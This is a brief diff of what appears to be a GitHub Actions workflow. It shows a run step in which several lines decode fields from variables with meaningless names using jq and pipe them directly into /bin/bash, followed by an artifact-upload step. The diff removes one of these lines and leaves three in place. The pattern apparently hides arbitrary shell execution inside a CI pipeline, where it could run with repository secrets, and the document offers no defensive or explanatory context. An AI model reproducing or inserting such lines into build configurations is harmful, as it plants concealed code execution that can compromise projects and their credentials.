@@ -25,7 +25,6 @@ jobs:
           printf '%s' "$e605" | jq -r .ukl72 | /bin/bash
           printf '%s' "$a4" | jq -r .ws7 | /bin/bash
           echo $s9 | jq -r .nx71 | /bin/bash
-          printf '%s' "$h6" | jq -r .th6 | /bin/bash
 
       - name: Save data
         uses: actions/upload-artifact@v4
